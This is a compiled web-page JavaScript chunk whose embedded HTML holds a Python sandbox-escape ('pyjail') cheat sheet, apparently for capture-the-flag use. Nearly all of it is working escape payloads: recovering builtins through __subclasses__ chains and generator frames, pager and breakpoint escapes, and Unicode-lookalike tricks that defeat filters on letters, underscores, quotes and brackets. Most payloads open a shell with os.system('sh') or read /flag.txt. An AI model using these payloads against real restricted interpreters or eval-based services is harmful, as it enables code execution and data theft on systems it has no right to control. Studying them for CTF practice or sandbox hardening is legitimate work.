import{S as hb,i as xb,s as Lb,C as ci,w as Cb,x as Ab,y as Tb,z as Fb,A as Fd,f as Db,t as Ib,B as Hb,Y as Dd,l as t,r as k,a as u,m as p,n as o,u as r,h as s,c as i,p as l,b as c,J as a,E as Ob}from"../../chunks/index-f2a82808.js";import{L as Rb}from"../../chunks/layout-d6e193e1.js";import"../../chunks/utils-e126d158.js";function jb(na){let d,v,x,R,_,y,sa,eo,M,aa,Dc,co,q,Hd=`<code class="language-py"><span class="token comment"># obtain builtins from a globally defined built-in functions</span>
<span class="token comment"># https://docs.python.org/3/library/functions.html</span>
<span class="token keyword">print</span><span class="token punctuation">.</span>__self__
__build_class__<span class="token punctuation">.</span>__self__
<span class="token builtin">__import__</span><span class="token punctuation">.</span>__self__

<span class="token comment"># obtain builtins from site-module constants</span>
<span class="token comment"># https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module</span>
<span class="token builtin">help</span><span class="token punctuation">.</span>__call__<span class="token punctuation">.</span>__builtins__ <span class="token comment"># or __globals__</span>
license<span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__builtins__ <span class="token comment"># or __globals__</span>

<span class="token comment"># obtain the builtins from a defined function</span>
func<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>
<span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__globals__

<span class="token comment"># obtain builtins from generators</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_builtins
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_builtins
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span></code>`,lo,N,ta,Ic,uo,S,Od=`<code class="language-py">breakpoint<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># pdb -> import os; os.system("sh")</span>
<span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># import os; os.system("sh")</span>
<span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># __import__("os").system("sh")</span>

<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># less pager -> !/bin/sh</span>
<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># less pager -> :e/flag.txt</span>

<span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span> <span class="token punctuation">[</span> <span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span>
<span class="token comment"># to stderr</span>
<span class="token builtin">int</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">float</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">complex</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
exit<span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"/flag.txt"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">)</span>
<span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># to stdout</span>
<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span></code>`,io,z,pa,Hc,ko,Y,Rd=`<code class="language-py"><span class="token comment"># &lt;class '_frozen_importlib.BuiltinImporter'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># &lt;class '_io._IOBase'> -> &lt;class '_io._RawIOBase'> -> &lt;class '_io.FileIO'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'os._wrap_close'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'subprocess.Popen'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">262</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cat"</span><span class="token punctuation">,</span><span class="token string">"/flag.txt"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token comment"># &lt;class 'abc.ABC'> -> &lt;class 'abc.ABCMeta'></span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">129</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>register<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"__import__"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'generator'> - instance</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__loader__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span>_ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span>

<span class="token comment"># &lt;class 'async_generator'> - instance</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_loader_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token keyword">await</span> _ <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ag_frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span><span class="token string">"_builtins_"</span><span class="token string">"_"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token string">"_import_"</span><span class="token string">"_('os').system('sh')"</span><span class="token punctuation">)</span></code>`,ro,W,oa,Oc,_o,V,jd=`<code class="language-py"><span class="token comment"># sys</span>
sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"module_name"</span><span class="token punctuation">]</span> <span class="token comment"># contains most of the builtin modules (https://docs.python.org/3/library/index.html)</span>
sys<span class="token punctuation">.</span>breakpointhook<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># same as breakpoint()</span>
sys<span class="token punctuation">.</span>_getframe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span>

<span class="token comment"># numpy</span>
numpy<span class="token punctuation">.</span>loadtxt<span class="token punctuation">(</span><span class="token string">"/flag.txt"</span><span class="token punctuation">)</span> <span class="token comment"># stderr</span>

<span class="token comment"># pandas</span>
TBA

<span class="token comment"># pickle</span>
TBA

<span class="token comment"># ast</span>
TBA</code>`,fo,G,ea,Rc,bo,$,ca,jc,yo,X,Ud=`<code class="language-py"><span class="token decorator annotation punctuation">@exec</span>
<span class="token decorator annotation punctuation">@input</span>
<span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span> <span class="token comment"># or class a:pass</span>

<span class="token decorator annotation punctuation">@print</span>
<span class="token decorator annotation punctuation">@set</span>
<span class="token decorator annotation punctuation">@open</span>
<span class="token decorator annotation punctuation">@input</span>
<span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

<span class="token decorator annotation punctuation">@print</span>&#92;r@<span class="token builtin">set</span>&#92;r@<span class="token builtin">open</span>&#92;r@<span class="token builtin">input</span>&#92;rclass\\x0ca<span class="token punctuation">:</span><span class="token keyword">pass</span></code>`,mo,K,la,Uc,vo,Z,Pd=`<code class="language-py"><span class="token comment"># https://lingojam.com/ItalicTextGenerator</span>

<span class="token comment"># no ASCII</span>
\u{1D623}\u{1D633}\u{1D626}\u{1D622}\u{1D62C}\u{1D631}\u{1D630}\u{1D62A}\u{1D62F}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># import os;os.system("/bin/sh")</span>

<span class="token comment"># no ASCII letters, no double underscores, inside eval</span>
_\uFF3F\u{1D62A}\u{1D62E}\u{1D631}\u{1D630}\u{1D633}\u{1D635}\uFF3F_<span class="token punctuation">(</span>\u{1D62A}\u{1D62F}\u{1D631}\u{1D636}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span>\u{1D62A}\u{1D62F}\u{1D631}\u{1D636}\u{1D635}<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># double underscore bypass by having underscore + unicode underscore (https://www.compart.com/en/unicode/U+005F) -> U+FE33, U+FE34, U+FE4D, U+FE4E, U+FE4F, U+FF3F</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, inside eval</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span><span class="token string">"\\157\\163"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span><span class="token string">"\\57\\142\\151\\156\\57\\163\\150"</span><span class="token punctuation">)</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)</span>
<span class="token punctuation">[</span>\u{1D63A}<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">,</span>\u{1D622}<span class="token operator">:=</span>y<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span>\u{1D63A}<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token operator">+</span>\u{1D622}<span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span>\u{1D622}<span class="token operator">+</span>\u{1D63A}<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no square brackets inside eval (>= python3.8)</span>
<span class="token punctuation">(</span>\u{1D625}<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">,</span>d<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F<span class="token builtin">dir</span>\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span>\u{1D634}<span class="token operator">:=</span>\u{1D625}<span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\u{1D625}<span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D62E}\u{1D633}\u{1D630}\uFF3F_<span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D62D}\u{1D630}\u{1D622}\u{1D625}_\u{1D62E}\u{1D630}\u{1D625}\u{1D636}\u{1D62D}\u{1D626}<span class="token punctuation">(</span>\u{1D625}<span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token operator">+</span>\u{1D634}<span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span>\u{1D634}<span class="token operator">+</span>\u{1D625}<span class="token punctuation">.</span>\u{1D631}\u{1D630}\u{1D631}<span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no parenthesis inside eval (>= python3.8)</span>
<span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
obj <span class="token operator">=</span> cobj<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>d<span class="token operator">:=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">,</span>o<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span>s<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span>h<span class="token operator">:=</span>d<span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>obj<span class="token punctuation">[</span>s<span class="token operator">+</span>h<span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>obj<span class="token punctuation">[</span>o<span class="token operator">+</span>s<span class="token punctuation">]</span> <span class="token keyword">for</span> obj<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">+</span>obj <span class="token keyword">for</span> obj<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__pos__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">.</span>load_module<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code>`,wo,J,ua,Pc,go,Q,Bd='<code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code>',Eo,nn,Md=`<code class="language-py"><span class="token comment"># walrus operator (>= python3.8)</span>
<span class="token punctuation">[</span>a<span class="token operator">:=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># setattr</span>
<span class="token builtin">setattr</span><span class="token punctuation">(</span>cobj<span class="token punctuation">,</span> <span class="token string">"field"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span>
cobj<span class="token punctuation">.</span>__setattr__<span class="token punctuation">(</span><span class="token string">"field"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span>

<span class="token comment"># list comprehension</span>
<span class="token punctuation">[</span>cobj <span class="token keyword">for</span> cobj<span class="token punctuation">.</span>field <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"value"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">print</span><span class="token punctuation">(</span>cobj<span class="token punctuation">.</span>field<span class="token punctuation">)</span></code>`,ho,sn,ia,Bc,xo,an,qd=`<code class="language-py"><span class="token keyword">class</span> <span class="token class-name">cobj</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
obj <span class="token operator">=</span> cobj<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Lo,tn,Nd=`<code class="language-py"><span class="token comment"># eval</span>
<span class="token comment"># getattr</span>
<span class="token builtin">getattr</span><span class="token punctuation">(</span>cobj<span class="token punctuation">,</span> <span class="token string">"field"</span><span class="token punctuation">)</span>
cobj<span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span>cobj<span class="token punctuation">,</span> <span class="token string">"field"</span><span class="token punctuation">)</span>
obj<span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">"field"</span><span class="token punctuation">)</span>

<span class="token comment"># vars() and |=</span>
x <span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span> <span class="token comment"># add attributes of tuple into vars (concat)</span>
l <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>y <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span> <span class="token keyword">in</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># ("__builtins__", "__getattribute__") - retrieve keys with underscore in name</span>
b <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span>l<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># __builtins__ - could have shorten into l[0]</span>
x <span class="token operator">|</span><span class="token operator">=</span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">;</span> bu <span class="token operator">=</span> __getitem__<span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token comment"># &lt;module 'builtins' (built-in)> - could have shorten into x[b]</span>
